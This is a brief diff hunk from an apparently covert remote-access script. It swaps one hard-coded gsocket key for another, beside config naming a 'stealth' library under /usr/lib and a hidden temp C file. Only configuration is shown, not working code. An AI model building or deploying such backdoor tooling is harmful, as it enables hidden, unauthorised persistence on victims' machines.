@@ -10,7 +10,7 @@ import subprocess
 import time
 
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
-GSOCKET_KEY = "GCpb4EGj3VxXdzHyk665a7"
+GSOCKET_KEY = "63PJN4Wet8jghVLncPfCVh"
 STEALTH_SO  = "/usr/lib/libstealth.so"
 STEALTH_SRC = "/tmp/.stealth_tmp.c"
 
